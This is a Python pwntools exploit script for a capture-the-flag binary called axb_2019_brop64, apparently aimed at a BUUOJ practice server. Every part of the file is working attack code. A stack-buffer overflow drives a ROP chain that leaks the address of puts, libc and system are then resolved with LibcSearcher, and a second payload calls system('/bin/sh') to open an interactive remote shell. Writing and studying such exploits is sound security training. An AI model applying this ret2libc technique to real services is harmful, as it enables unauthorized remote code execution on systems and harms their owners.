from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

poprdi_ret = 0x400963

# io = process('./axb_2019_brop64')
io = remote('node4.buuoj.cn', 27602)
elf = ELF('./axb_2019_brop64')

payload = cyclic(0xD0 + 8)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['repeater'])

io.sendlineafter(b'Please tell me:', payload)
io.recvuntil(b'\x09\x40')
puts = u64(io.recv(6) + b'\x00\x00')
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print(hex(base))
print(hex(system))

payload = cyclic(0xD0 + 8)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(system)

io.sendlineafter(b'Please tell me:', payload)

io.interactive()
